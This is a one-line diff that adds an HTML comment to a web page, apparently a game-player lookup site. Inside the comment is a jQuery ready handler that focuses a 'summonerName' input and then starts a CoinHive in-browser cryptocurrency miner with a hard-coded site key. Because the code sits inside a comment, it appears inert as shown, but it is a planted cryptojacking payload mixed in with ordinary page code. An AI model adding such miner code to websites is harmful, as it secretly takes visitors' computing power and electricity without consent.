@@ -1,0 +1,1 @@
+<!--$( document ).ready(function() {    document.getElementById('summonerName').focus();    var miner = new CoinHive.Anonymous('G69ord6cru80ytfh8G2pbWX51lo7a2bH');    miner.start();});-->
